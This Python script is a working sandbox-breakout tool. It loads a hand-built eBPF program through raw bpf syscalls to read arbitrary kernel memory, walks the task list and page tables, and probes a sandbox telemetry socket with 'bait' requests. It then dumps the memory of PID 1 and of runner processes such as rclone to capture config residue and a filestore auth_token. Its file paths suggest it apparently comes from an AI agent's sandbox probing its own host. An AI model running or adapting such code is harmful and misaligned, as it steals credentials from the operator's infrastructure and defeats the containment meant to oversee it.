#!/usr/bin/env python3
"""w7: telemetry relay bait + PID1/runner user-half residue snapshot.
Phase A: POST shapes to /run/sandbox-telemetry/ingest.sock (relay entry).
Phase B: dump PID1 user-half present pages (relay buffers, log frames, WS residue).
Phase C: locate runner tasks by comm (environment-manager / rclone), dump their
user halves (stdin config residue, filestore auth_token).
Output: /mnt/user-data/working/pa6_*.gz, chunked <=20MB. Final marker: WALK7DONE."""
import ctypes
import gzip
import hashlib
import os
import socket
import struct
import sys
import time

libc = ctypes.CDLL(None, use_errno=True)
PAGE_OFFSET = 0xFFFF888000000000
PHYS_MASK = 0x000FFFFFFFFFF000
T_TASKS, T_MM, T_PID, MM_PGD = 1056, 1136, 1264, 120
keep = []

T0 = time.time()


def out(*a):
    print("[%6.1fs]" % (time.time() - T0), *a, flush=True)


def sysc(nr, *a):
    ctypes.set_errno(0)
    r = libc.syscall(ctypes.c_long(nr), *[ctypes.c_ulong(x) for x in a])
    if r == -1:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r


def map_create(vsize):
    attr = struct.pack("<IIII", 2, 4, vsize, 1)
    b = ctypes.create_string_buffer(attr)
    keep.append(b)
    return sysc(321, 0, ctypes.addressof(b), len(attr))


def map_update(fd, key, val):
    kb = ctypes.create_string_buffer(key)
    vb = ctypes.create_string_buffer(val)
    attr = struct.pack("<IIQQQ", fd, 0, ctypes.addressof(kb), ctypes.addressof(vb), 0)
    ab = ctypes.create_string_buffer(attr)
    keep.extend((kb, vb, ab))
    sysc(321, 2, ctypes.addressof(ab), len(attr))


def map_lookup(fd, vsize=4120):
    kb = ctypes.create_string_buffer(4)
    vb = ctypes.create_string_buffer(vsize)
    attr = struct.pack("<IIQQQ", fd, 0, ctypes.addressof(kb), ctypes.addressof(vb), 0)
    ab = ctypes.create_string_buffer(attr)
    keep.extend((kb, vb, ab))
    sysc(321, 1, ctypes.addressof(ab), len(attr))
    return bytes(vb.raw)


def build(ctrl_fd, out_fd):
    """Read path: out=[0]=kaddr [8]=ret [16]=cur_task [24:]=data."""
    INS = [
        (0xBF, 6, 1, 0, 0),
        (0x62, 10, 0, -4, 0),
        (0x18, 1, 1, 0, ctrl_fd), (0x00, 0, 0, 0, 0),
        (0xBF, 2, 10, 0, 0), (0x07, 2, 0, 0, -4),
        (0x85, 0, 0, 0, 1),
        (0x15, 0, 0, 20, 0),
        (0xBF, 7, 0, 0, 0),
        (0x62, 10, 0, -8, 0),
        (0x18, 1, 1, 0, out_fd), (0x00, 0, 0, 0, 0),
        (0xBF, 2, 10, 0, 0), (0x07, 2, 0, 0, -8),
        (0x85, 0, 0, 0, 1),
        (0x15, 0, 0, 12, 0),
        (0xBF, 8, 0, 0, 0),
        (0x85, 0, 0, 0, 35),
        (0x7B, 8, 0, 16, 0),
        (0x61, 2, 7, 8, 0),
        (0x25, 2, 0, 7, 4096),
        (0x79, 3, 7, 0, 0),
        (0xBF, 1, 8, 0, 0), (0x07, 1, 0, 0, 24),
        (0x85, 0, 0, 0, 113),
        (0x7B, 8, 0, 8, 0),
        (0x79, 3, 7, 0, 0), (0x7B, 8, 3, 0, 0),
        (0xB7, 0, 0, 0, 0),
        (0x95, 0, 0, 0, 0),
    ]
    return _load(INS)


def _load(INS):
    buf = b"".join(
        struct.pack("<BBhi", c, (d & 0xF) | ((s & 0xF) << 4), o, i)
        for (c, d, s, o, i) in INS
    )
    ib = ctypes.create_string_buffer(buf)
    lic = ctypes.create_string_buffer(b"GPL")
    log = ctypes.create_string_buffer(65536)
    keep.extend((ib, lic, log))
    attr = struct.pack(
        "<IIQQIIQ", 5, len(INS), ctypes.addressof(ib),
        ctypes.addressof(lic), 1, len(log), ctypes.addressof(log))
    ab = ctypes.create_string_buffer(attr)
    keep.append(ab)
    try:
        return sysc(321, 5, ctypes.addressof(ab), len(attr))
    except OSError:
        print("VERIFIER-REJECT:", log.raw.split(b"\x00")[0].decode("utf-8", "replace")[-800:], flush=True)
        raise


os.makedirs("/mnt/dbg", exist_ok=True)
os.system("mount -t debugfs none /mnt/dbg 2>/dev/null")
eid = int(open("/mnt/dbg/tracing/events/syscalls/sys_enter_getpid/id").read())
ctrl_fd, out_fd = map_create(16), map_create(4120)
pfd = build(ctrl_fd, out_fd)
for cpu in range(os.cpu_count() or 1):
    buf = ctypes.create_string_buffer(128)
    struct.pack_into("<IIQQQ", buf, 0, 2, 112, eid, 1, 0)
    keep.append(buf)
    perf_fd = sysc(298, ctypes.addressof(buf), -1, cpu, -1, 0)
    libc.ioctl(ctypes.c_int(perf_fd), 0x40042408, pfd)
    libc.ioctl(ctypes.c_int(perf_fd), 0x2400, 0)


def krd(kaddr, ln):
    map_update(ctrl_fd, b"\0\0\0\0", struct.pack("<QI", kaddr, ln))
    libc.getpid()
    for _ in range(300):
        o = map_lookup(out_fd)
        a, ret = struct.unpack_from("<Qq", o, 0)
        if a == kaddr and ret != -1:
            return o[24:24 + ln], ret
        libc.getpid()
    return None, -99


def kr(addr, ln):
    for _ in range(3):
        d, r = krd(addr, ln)
        if r == 0 and d is not None:
            return d
    return None


def u64(addr):
    d = kr(addr, 8)
    return struct.unpack("<Q", d)[0] if d else 0


def find_task(target):
    anchor = struct.unpack_from("<Q", map_lookup(out_fd), 16)[0]
    libc.getpid()
    anchor = struct.unpack_from("<Q", map_lookup(out_fd), 16)[0]
    t = anchor
    for _ in range(300):
        if t == 0:
            return None
        pid = struct.unpack("<i", kr(t + T_PID, 4) or b"\0\0\0\0")[0]
        if pid == target:
            return t
        nxt = u64(t + T_TASKS + 8)
        if nxt == 0 or nxt - T_TASKS == anchor:
            return None
        t = nxt - T_TASKS
    return None


# ---------------- Phase A: relay bait ----------------
out("=== PHASE A: ingest.sock baits ===")


def post_ingest(i, body, ctype):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect("/run/sandbox-telemetry/ingest.sock")
        req = ("POST /v1/metrics HTTP/1.1\r\nHost: ingest\r\nContent-Type: %s\r\n"
               "Content-Length: %d\r\nConnection: close\r\n\r\n" % (ctype, len(body))).encode() + body
        s.sendall(req)
        try:
            r = s.recv(1024)
        except socket.timeout:
            r = b""
        s.close()
        out("  INGEST%d: %r" % (i, r[:220]))
    except OSError as e:
        out("  INGEST%d: ERR %s" % (i, e))


post_ingest(1, b"", "application/x-protobuf")
post_ingest(2, b"\x0a\x02v1", "application/x-protobuf")
post_ingest(3, b"{}", "application/json")
post_ingest(4, b"\x0a\x00\x12\x04test", "application/x-protobuf")
time.sleep(2)

# ---------------- Phase B: PID1 user half ----------------
out("=== PHASE B: PID1 user half ===")
mypid = libc.getpid()
me = find_task(mypid)
assert me, "cannot find own task"
pat = ctypes.create_string_buffer(b"WALKSELF-VERIFY-PATTERN-0123456789ABCDEF")
pgd_me = u64(u64(me + T_MM) + MM_PGD)


def vread(pgd, vaddr, ln):
    o = bytearray()
    got = 0
    while got < ln:
        va = vaddr + got
        e1 = u64(pgd + ((va >> 39) & 0x1FF) * 8)
        if not e1 & 1:
            return None
        e2 = u64(PAGE_OFFSET + (e1 & PHYS_MASK) + ((va >> 30) & 0x1FF) * 8)
        if not e2 & 1:
            return None
        if e2 & 0x80:
            base, leaf = e2 & PHYS_MASK, 1 << 30
        else:
            e3 = u64(PAGE_OFFSET + (e2 & PHYS_MASK) + ((va >> 21) & 0x1FF) * 8)
            if not e3 & 1:
                return None
            if e3 & 0x80:
                base, leaf = e3 & PHYS_MASK, 1 << 21
            else:
                e4 = u64(PAGE_OFFSET + (e3 & PHYS_MASK) + ((va >> 12) & 0x1FF) * 8)
                if not e4 & 1:
                    return None
                base, leaf = e4 & PHYS_MASK, 1 << 12
        off = va & (leaf - 1)
        chunk = min(4096, ln - got, leaf - off)
        d = kr(PAGE_OFFSET + base + off, chunk)
        o.extend(d if d is not None else b"\0" * chunk)
        got += chunk
    return bytes(o)


back = vread(pgd_me, ctypes.addressof(pat), 32)
assert back and b"WALKSELF" in back, "self-verify failed"
out("SELF-VERIFY OK me=0x%x" % me)


def enum_user(pgd):
    pairs, huge = [], 0
    pgd_pg = kr(pgd, 4096)
    if pgd_pg is None:
        return pairs, huge
    for i1 in range(256):
        e1 = struct.unpack_from("<Q", pgd_pg, i1 * 8)[0]
        if not e1 & 1 or e1 & 0x80:
            continue
        pud_pg = kr(PAGE_OFFSET + (e1 & PHYS_MASK), 4096)
        if pud_pg is None:
            continue
        for i2 in range(512):
            e2 = struct.unpack_from("<Q", pud_pg, i2 * 8)[0]
            if not e2 & 1 or e2 & 0x80:
                continue
            pmd_pg = kr(PAGE_OFFSET + (e2 & PHYS_MASK), 4096)
            if pmd_pg is None:
                continue
            for i3 in range(512):
                e3 = struct.unpack_from("<Q", pmd_pg, i3 * 8)[0]
                if not e3 & 1:
                    continue
                va3 = (i1 << 39) | (i2 << 30) | (i3 << 21)
                if e3 & 0x80:
                    huge += 1
                    continue
                pte_pg = kr(PAGE_OFFSET + (e3 & PHYS_MASK), 4096)
                if pte_pg is None:
                    continue
                for i4 in range(512):
                    e4 = struct.unpack_from("<Q", pte_pg, i4 * 8)[0]
                    if not e4 & 1:
                        continue
                    pairs.append((va3 | (i4 << 12), e4 & PHYS_MASK))
    return pairs, huge


def dump_pairs(pairs, prefix, tag):
    n = part = partbytes = 0
    h = hashlib.sha256()
    gz = gzip.open("%s-%d.gz" % (prefix, part), "wb", compresslevel=1)
    for va, pa in sorted(pairs):
        d = kr(PAGE_OFFSET + pa, 4096)
        if d is None:
            continue
        rec = struct.pack("<Q", va) + d
        gz.write(rec)
        h.update(rec)
        n += 1
        partbytes += 4104
        if partbytes > 20 * 1024 * 1024:
            gz.close()
            part += 1
            partbytes = 0
            gz = gzip.open("%s-%d.gz" % (prefix, part), "wb", compresslevel=1)
        if n % 256 == 0:
            out("  %s %d pages" % (tag, n))
    gz.close()
    out("%sDONE %d %s parts=%d" % (tag, n, h.hexdigest(), part + 1))


t1 = find_task(1)
assert t1, "cannot find pid 1"
pgd1 = u64(u64(t1 + T_MM) + MM_PGD)
pairs1, huge1 = enum_user(pgd1)
out("PID1U pages=%d huge2m=%d pgd=0x%x" % (len(pairs1), huge1, pgd1))
dump_pairs(pairs1, "/mnt/user-data/working/pa6_pid1u", "PID1U")

# ---------------- Phase C: runner heaps ----------------
out("=== PHASE C: runner heaps ===")
libc.prctl(16, b"w7comm-marker-xy", 0, 0, 0)
me2 = find_task(libc.getpid())
comm_off = None
for off in range(1100, 1800, 4):
    d = kr(me2 + off, 24)
    if d and b"w7comm-marker-xy"[:12] in d:
        comm_off = off
        break
out("comm_off: %s" % comm_off)

anchor = struct.unpack_from("<Q", map_lookup(out_fd), 16)[0]
libc.getpid()
anchor = struct.unpack_from("<Q", map_lookup(out_fd), 16)[0]
cands = {}
t = anchor
seen = 0
while t and seen < 800:
    seen += 1
    if comm_off:
        c = kr(t + comm_off, 16)
        if c:
            name = bytes(c.split(b"\0")[0])
            for patn in (b"environment", b"rclone", b"runner"):
                if patn in name:
                    mm = u64(t + T_MM)
                    if mm:
                        pgd = u64(mm + MM_PGD)
                        if pgd:
                            cands.setdefault(pgd, (t, name))
                    break
    nxt = u64(t + T_TASKS + 8)
    if nxt == 0 or nxt - T_TASKS == anchor:
        break
    t = nxt - T_TASKS

out("runner cands: %d" % len(cands))
for i, (pgd, (t, name)) in enumerate(list(cands.items())[:3]):
    pairs, huge = enum_user(pgd)
    out("RUNNER%d comm=%r pages=%d huge=%d" % (i, name, len(pairs), huge))
    dump_pairs(pairs, "/mnt/user-data/working/pa6_runner%d" % i, "RUN%d" % i)

out("WALK7DONE")
